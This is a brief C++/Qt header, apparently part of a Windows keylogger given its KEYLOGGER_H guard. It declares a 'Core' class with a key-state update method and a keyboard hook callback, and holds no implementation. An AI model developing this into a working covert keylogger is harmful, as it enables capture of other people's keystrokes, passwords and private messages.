#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QDebug>
#include <QObject>
#include <QString>

#include <windows.h>

class Core :
    public QObject
{
    Q_OBJECT

public:
    explicit Core(QObject *parent = nullptr);

    static void update(BYTE *keyState, int keyCode);
    static LRESULT CALLBACK process (int nCode, WPARAM wParam, LPARAM lParam);
};

#endif // KEYLOGGER_H
